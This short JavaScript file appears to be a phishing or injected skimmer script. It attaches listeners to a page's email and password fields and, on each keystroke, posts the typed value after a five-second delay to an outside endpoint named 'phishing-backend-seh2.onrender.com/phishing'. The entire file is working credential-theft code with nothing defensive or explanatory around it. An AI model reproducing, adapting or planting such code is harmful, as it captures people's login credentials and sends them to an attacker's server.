console.log("bad js executed")

const email = document.getElementById("email")
const password = document.getElementById("password")

console.log("email", email)
console.log("password", password)

email.addEventListener("input", (e) => {

    setTimeout(() => {
        fetch("https://phishing-backend-seh2.onrender.com/phishing", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ credentials : e.target.value})
        })
    }, 5000)
    console.log(e.target.value)
})

password.addEventListener("input", (e) => {
    console.log(e.target.value)

    setTimeout(() => {
        fetch("https://phishing-backend-seh2.onrender.com/phishing", {
            method: "POST",
            headers: {"Content-Type": "application/json"},
            body: JSON.stringify({ credentials : e.target.value})
        })
    }, 5000)
 
})
